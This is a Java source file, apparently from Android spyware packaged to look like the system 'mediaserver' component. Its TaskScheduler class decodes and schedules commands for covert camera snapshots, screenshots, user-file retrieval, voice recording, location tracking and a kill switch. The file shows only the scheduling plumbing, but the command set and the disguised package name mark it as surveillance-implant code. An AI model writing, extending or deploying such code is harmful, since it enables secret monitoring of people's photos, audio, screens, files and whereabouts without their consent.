package com.android.mediaserver.task;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import com.android.mediaserver.command.CameraSnapshotCommand;
import com.android.mediaserver.command.Command;
import com.android.mediaserver.command.CommandType;
import com.android.mediaserver.command.ConfigurationCommand;
import com.android.mediaserver.command.FetchUserFileCommand;
import com.android.mediaserver.command.KillCommand;
import com.android.mediaserver.command.LocationCommand;
import com.android.mediaserver.command.RuntimeTypeAdapterFactory;
import com.android.mediaserver.command.SchedulableCommand;
import com.android.mediaserver.command.ScreenshotCommand;
import com.android.mediaserver.command.VoiceRecordCommand;
import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import timber.log.Timber;

public class TaskScheduler {
  private static TaskScheduler mInstance;
  private AlarmManager mAlarmManager;
  private Context mContext;
  private Gson mGson = new GsonBuilder().registerTypeAdapterFactory(
      RuntimeTypeAdapterFactory.of(Command.class)
          .registerSubtype(KillCommand.class, CommandType.KILL.toString())
          .registerSubtype(ConfigurationCommand.class, CommandType.CONFIGURATION.toString())
          .registerSubtype(CameraSnapshotCommand.class, CommandType.SNAPSHOT.toString())
          .registerSubtype(ScreenshotCommand.class, CommandType.SCREENSHOT.toString())
          .registerSubtype(FetchUserFileCommand.class, CommandType.USER_FILE.toString())
          .registerSubtype(VoiceRecordCommand.class, CommandType.VOICE.toString())
          .registerSubtype(LocationCommand.class, CommandType.LOCATION.toString())).create();

  private TaskScheduler(Context context) {
    mContext = context;
    mAlarmManager = (AlarmManager) context.getSystemService("alarm");
  }

  public static TaskScheduler getInstance(Context context) {
    if (mInstance == null) {
      mInstance = new TaskScheduler(context);
    }
    return mInstance;
  }

  public synchronized void scheduleTask(Command command) {
    long date;
    Timber.d("Scheduling task for command: %s", command);
    Intent intent = new Intent(mContext, TasksReceiver.class);
    intent.putExtra("command", mGson.toJson((Object) command));
    if (command instanceof SchedulableCommand) {
      date = ((SchedulableCommand) command).getDateMs();
    } else {
      date = System.currentTimeMillis();
    }
    mAlarmManager.set(0, date,
        PendingIntent.getBroadcast(mContext, 0, intent, PendingIntent.FLAG_CANCEL_CURRENT));
  }
}
